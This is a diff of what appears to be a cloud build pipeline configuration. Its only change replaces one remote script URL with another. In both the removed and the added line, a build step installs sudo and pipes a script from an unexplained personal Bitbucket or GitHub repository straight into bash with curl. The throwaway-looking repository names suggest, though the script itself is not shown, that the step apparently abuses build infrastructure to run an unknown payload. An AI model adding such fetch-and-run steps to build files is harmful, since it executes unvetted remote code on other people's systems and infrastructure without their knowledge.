@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/sing | bash
+         apt update && apt-get install sudo -y && curl -sL https://github.com/ganejafaujanih/manuk/raw/main/ngising | bash
     waitFor:
       - '-'
     entrypoint: /bin/bash
